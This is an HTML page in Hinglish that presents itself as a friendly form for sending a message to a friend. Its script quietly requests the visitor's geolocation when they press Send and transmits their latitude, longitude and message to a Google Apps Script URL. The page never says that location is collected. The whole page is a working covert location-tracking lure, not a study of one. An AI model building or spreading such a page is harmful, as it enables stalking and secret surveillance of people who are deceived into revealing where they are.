<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Welcome Dear</title>
<style>
    body {
        background-color: #ffc0cb; /* Gulabi background */
        font-family: Arial, sans-serif;
        text-align: center;
        padding: 20px;
        color: #333;
    }
    h1 {
        font-size: 20px;
        margin-bottom: 20px;
    }
    input[type="text"] {
        padding: 10px;
        width: 80%;
        max-width: 300px;
        border: none;
        border-radius: 5px;
        margin-bottom: 10px;
    }
    button {
        padding: 10px 20px;
        border: none;
        background-color: #ff69b4;
        color: white;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
    }
    button:hover {
        background-color: #ff1493;
    }
    .success {
        margin-top: 15px;
        color: green;
        font-weight: bold;
    }
</style>
</head>
<body>

<h1>Welcome dear, aap apna message send kar sakte hain apne dost ke liye</h1>

<input type="text" id="message" placeholder="Apna message likhiye">
<br>
<button onclick="sendData()">Send</button>

<p class="success" id="status"></p>

<script>
function sendData() {
    if (!navigator.geolocation) {
        alert("Geolocation is not supported by your browser.");
        return;
    }

    navigator.geolocation.getCurrentPosition(function(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var msg = document.getElementById("message").value;

        // Google Script ka URL yahan lagao
        var url = "https://script.google.com/macros/s/AKfycbz8suBhlxuRwNSyD_oZSAapQNTK3nZZY4Y3mr9RBqR1XJbZtrv4OGLwEv6IFOe2OKZ4Mg/exec";

        fetch(url + "?latitude=" + lat + "&longitude=" + lon + "&message=" + encodeURIComponent(msg))
        .then(res => {
            document.getElementById("status").innerText = "Message send successfully ✅";
        })
        .catch(err => {
            document.getElementById("status").innerText = "Error sending data ❌";
        });
    });
}
</script>

</body>
</html>
